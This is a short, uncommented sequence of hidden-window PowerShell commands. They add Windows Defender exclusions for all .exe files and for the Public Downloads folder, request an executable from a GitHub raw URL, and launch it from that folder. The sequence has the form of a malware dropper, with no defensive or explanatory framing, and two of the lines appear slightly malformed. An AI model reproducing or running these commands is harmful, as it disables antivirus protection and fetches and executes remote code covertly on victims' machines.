powershell -WindowStyle Hidden Command Add-MpPreference -ExclusionExtension ".exe"
powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"
powershell -WindowStyle Hidden -ep bypass iwr -uri https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Test.exe
powershell.exe -w hidden C:\Users\Public\Downloads\Test.exe
